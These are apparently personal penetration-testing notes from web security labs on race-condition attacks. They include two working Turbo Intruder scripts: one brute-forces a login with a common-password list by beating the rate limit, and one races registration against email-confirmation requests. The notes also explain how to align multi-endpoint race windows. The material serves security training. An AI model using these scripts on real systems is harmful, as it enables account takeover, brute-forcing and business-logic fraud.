
# Content
- [Methodology](#methodology)
- [Limit overrun race conditions](#limit-overrun-raceconditions)
- [Multi-endpoint race conditions](#multi-endpoint-race-conditions)

## Methodology
#### 1 - Predict potential collisions
- Is this endpoint security critical ?
- Is there any collision potential ?

#### 2 - Probe for clues
- Benchmark the normal behavior
- Benchmark the upnormal behavior

#### 3 - Prove the concept


## Limit overrun race conditions
The most well-known type of race condition enables you to exceed some kind of limit imposed by the business logic of the application. 


**EX:** 
- Redeeming a gift card multiple times
- Rating a product multiple times
- Withdrawing or transferring cash in excess of your account balance
- Reusing a single CAPTCHA solution
- Bypassing an anti-brute-force rate limit

### Detecting and exploiting limit overrun race conditions with Burp Repeater and turpo intruder 
- For HTTP/1, it uses the classic last-byte synchronization technique.
- For HTTP/2, it uses the single-packet attack technique

#### Burp Repeater
- Identify a single-use or rate-limited endpoint that has some kind of security impact or other useful purpose.
- Issue multiple requests to this endpoint in quick succession to see if you can overrun this limit.


#### turpo intruder 
script example on one endoint
```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords =[
    "123123",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "1234567890",
    "michael",
    "x654321",
    "superman",
    "1qaz2wsx",
    "baseball",
    "7777777",
    "121212",
    "000000"
]
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```
script example on two endoints
```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    confReq='''POST /confirm?token[]= HTTP/2
Host: 0ac000510411a9db80eac639002a0031.web-security-academy.net
Cookie: phpsessionid=LZCN4rftE1NqqOWwZdJnyYN47W5DySMX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://0ac000510411a9db80eac639002a0031.web-security-academy.net
Referer: https://0ac000510411a9db80eac639002a0031.web-security-academy.net/confirm
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
'''
    
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)


def handleResponse(req, interesting):
    table.add(req)
```

## Multi-endpoint race conditions
sending requests to multiple endpoints at the same time 

**EX:**


classic logic flaw in online stores where you add an item to your basket or cart, pay for it, then add more items to the cart before force-browsing to the order confirmation page. 

![race-conditions-basket-adjustment-race](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ca6050dd-4a6a-4a2c-99f3-b5943b9ff1a4)

In this case, you can potentially add more items to your basket during the race window between when the payment is validated and when the order is finally confirmed. 

#### Aligning multi-endpoint race windows Problems and Solutions

- **Delays introduced by network architecture**
```
Connection warming:

Back-end connection delays don't usually interfere with race condition attacks because they typically delay parallel requests equally, so the requests stay in sync.

you can try adding a GET request for the homepage to the start of your tab group with to ohter endpoints to test , then using the Send group in sequence (single connection) option. 

If the first request still has a longer processing time, but the rest of the requests are now processed within a short window
```

- **Delays introduced by endpoint-specific processing**
```
Abusing rate or resource limits :

Web servers often delay the processing of requests if too many are sent too quickly.

By sending a large number of dummy requests to intentionally trigger the rate or resource limit, you may be able to cause a suitable server-side delay.

This makes the single-packet attack viable even when delayed execution is required.  
```

![race-conditions-abusing-rate-or-resource-limits](https://github.com/kiro6/penetration-testing-notes/assets/57776872/75b44be3-ff28-42f9-a554-2e20fd9dde12)


## Single-endpoint race conditions
Sending parallel requests with different values to a single endpoint can sometimes trigger powerful race conditions. 

**EX:**

![race-conditions-password-reset-collision](https://github.com/kiro6/penetration-testing-notes/assets/57776872/c11c30f8-2ba6-491d-866a-f3887c8ad0a6)


the final state when all operations are complete:
- session['reset-user'] = victim
- session['reset-token'] = 1234

The session now contains the victim's user ID, but the valid reset token is sent to the attacker. 


## Partial construction race conditions

